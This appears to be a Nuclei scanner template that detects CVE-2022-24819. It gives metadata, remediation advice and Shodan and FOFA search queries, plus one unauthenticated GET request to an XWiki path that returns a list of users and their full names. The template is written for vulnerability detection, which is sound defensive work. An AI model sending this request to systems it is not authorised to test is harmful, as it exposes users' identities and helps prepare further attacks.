id: CVE-2022-24819

info:
  name: XWiki Unauthenticated User Enumeration
  author: ProjectDiscoveryAI
  severity: medium
  description: An unauthenticated user can retrieve a list of users and their full names through a publicly accessible URL in certain versions of XWiki.
  impact: |
    An attacker can enumerate valid usernames, facilitating further attacks.
  remediation: |
    Upgrade XWiki to version 12.10.10, 12.9.11, or 12.8.12 to mitigate the vulnerability.
  reference:
    - https://jira.xwiki.org/browse/XWIKI-18850
    - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-24819
    - https://github.com/xwiki/xwiki-platform/security/advisories/GHSA-97jg-43c9-q6pf
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N
    cvss-score: 5.3
    cve-id: CVE-2022-24819
    cwe-id: CWE-359
    epss-score: 0.00163
    epss-percentile: 0.54124
    cpe: cpe:2.3:a:xwiki:xwiki:*:*:*:*:*:*:*:*
  metadata:
    vendor: xwiki
    product: xwiki
    shodan-query: html:"data-xwiki-reference"
    fofa-query: body="data-xwiki-reference"

http:
  - method: GET
    path:
      - "{{BaseURL}}/bin/login/XWikiLogin?xpage=uorgsuggest&uorg=user&wiki=&media=json"

    matchers:
      - type: word
        words:
          - "userfullname"
        part: body
